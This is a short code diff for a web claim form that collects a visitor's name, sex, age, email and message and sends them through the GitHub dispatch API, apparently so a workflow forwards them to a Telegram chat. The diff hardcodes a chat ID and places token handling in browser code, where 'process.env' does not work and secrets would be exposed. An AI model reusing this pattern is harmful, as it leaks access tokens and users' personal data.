@@ -141,14 +141,17 @@ document.getElementById('claimForm').addEventListener('submit', function(event) 
     const email = document.getElementById('email').value;
     const message = document.getElementById('message').value;
 
+    const chatID = '297203268';  // Your chat ID
+    const botToken = 'YOUR_BOT_TOKEN';  // Your bot token (do not hardcode in frontend!)
+
     const text = `New Claim Submitted:\nName: ${name}\nSex: ${sex}\nAge: ${age}\nEmail: ${email}\nMessage: ${message}`;
 
-    // Send the data to GitHub API (replace with your actual access token and username)
+    // This will call the backend GitHub API (GitHub Actions)
     fetch('https://api.github.com/repos/Luketan888/huatbigbig-page/dispatches', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            'Authorization': `token YOUR_GITHUB_PERSONAL_ACCESS_TOKEN`
+            'Authorization': `token ${process.env.PERSONAL_ACCESS_TOKEN}`  // Use GitHub secrets here
         },
         body: JSON.stringify({
             event_type: 'send-telegram-message',
